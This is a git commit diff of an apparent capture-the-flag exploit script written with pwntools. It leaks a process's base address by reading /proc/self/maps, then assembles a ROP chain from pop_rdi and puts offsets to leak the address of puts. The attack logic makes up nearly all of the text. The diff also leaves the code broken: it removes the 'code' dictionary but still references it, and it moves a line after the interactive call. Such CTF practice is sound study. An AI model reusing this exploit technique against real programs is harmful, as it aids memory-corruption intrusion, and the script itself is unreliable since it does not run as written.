93ec779eace6673f3d7287b2f182230963f9d96b
ctmbl <mabileau.clement@gmail.com>
2022-07-22 16:49:17 +0200

    Improve logic_bug script

--- logic_bug_ch6.py
+++ logic_bug_ch6.py
@@ -1,13 +1,10 @@
-#!/usr/bin/env python3
-
 from pwn import * 
 import sys
 from time import sleep
 
 def send(line):
-    print("Sending: ", line.decode())
+    print(" --> Sending: ", line.decode())
     target.sendline(line)
-    sleep(0.2)
 
 
 def pwn_it(guessed_address = 0x0):
@@ -15,29 +12,43 @@ def pwn_it(guessed_address = 0x0):
     send(b"2")
     print(target.recv().decode())
     send(b"/proc/self/maps")
-    line = target.recvline().decode().strip()
-    print("Get: ",line)
+    line = target.recvuntil(": ").decode().strip()
+    print(" --> Get: ",line)
     start_address = line.split()[0].split("-")[0]
-    print("start address is:", start_address)
-    offset = int("0x"+start_address, 16) 
-    print("offset is (decimal):", offset)
+    print(" --> start address is:", start_address)
+    offset = int(start_address, 16) 
+    print(f" --> offset is (decimal): {offset}, in hex: {hex(offset)}")
     
-    code = {'exit_prog' : 0x1cc0,
-            'puts' : 0x202ee0
-            'pop_rdi' : 
-        }
-    
+    exit_prog = 0x1cc0
+    puts = 0x202ee0
+    pop_rdi = 0x1e33
+    pop_rsi_r15 = 0x1e31
+     
     chose = 'puts'
     if chose not in code:
         print(chose, "not in", code)
         exit(1)
+    
+#     print(" --> Checksec:")
+#     binary = ELF("/home/clemab/Desktop/cs/ch6")
+#     binary.address = offset
+#     #print("\nChecksec:\n",binary.checksec())
+#     print(" --> Loading gadgets::")
+#     rop = ROP(binary)
+#     
+#     rop(rdi=binary.plt["puts"])
+#     print(rop.dump())
+#     print(rop.chain())
 
-    print(f"To execute '{chose}' put {p64(offset + code[chose])} in /tmp/exec")
+    rop = p64(offset+pop_rdi) + p64(offset+puts) + p64(offset+puts)
+
+#     print(f"To execute '{chose}' put {p64(offset + code[chose])} in /tmp/exec")
+    print(f"To leak puts address put {rop} in /tmp/exec")
     print("Pausing pwning")
 
-    execute_code = b"-8198"
-
     target.interactive()
+
+    execute_code = b"-8198"
 
     print("Restarting pwning")
 
